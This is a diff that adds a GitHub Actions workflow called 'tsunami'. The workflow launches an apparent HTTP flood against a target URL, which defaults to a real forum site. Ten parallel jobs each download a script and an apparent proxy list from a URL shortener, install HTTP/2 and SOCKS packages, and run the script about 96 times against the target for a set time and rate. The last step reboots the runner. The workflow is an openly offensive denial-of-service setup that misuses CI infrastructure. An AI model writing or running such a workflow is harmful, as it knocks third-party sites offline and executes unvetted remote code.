@@ -1,0 +1,53 @@
+name: tsunami
+on:
+  workflow_dispatch:
+    inputs:
+      target:
+        description: "URL"
+        required: true
+        default: "https://www.r10.net/"
+      time:
+        description: "Time)"
+        required: true
+        default: "115"
+      rate:
+        description: "Rate"
+        required: true
+        default: "100"
+
+jobs:
+  vds:
+    runs-on: ubuntu-latest
+    strategy:
+      max-parallel: 10
+      matrix:
+        instance: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]
+    
+    steps:
+    - name: Dosyaları indir ve hazırla
+      run: |
+        wget https://curl.by/dnHM-/tsu.js
+        wget https://curl.by/BtEN_/good.txt
+        chmod +x tsu.js
+        npm i hpack https commander colors socks
+    - name: run
+      run: |
+        TARGET="${{ inputs.target }}"
+        TIME="${{ inputs.time }}"
+        RATE="${{ inputs.rate }}"
+        
+        PIDS=()
+        for i in {1..96}; do
+          sudo timeout $TIME node tsu.js "$TARGET" 95 "$RATE" 10 good.txt
+          PIDS+=($!)
+        done
+        
+        for pid in "${PIDS[@]}"; do
+          wait $pid
+        done
+    
+    - name: Bekleme
+      run: sleep ${{ inputs.time }}
+    
+    - name: Sistemi yeniden başlat
+      run: sudo reboot
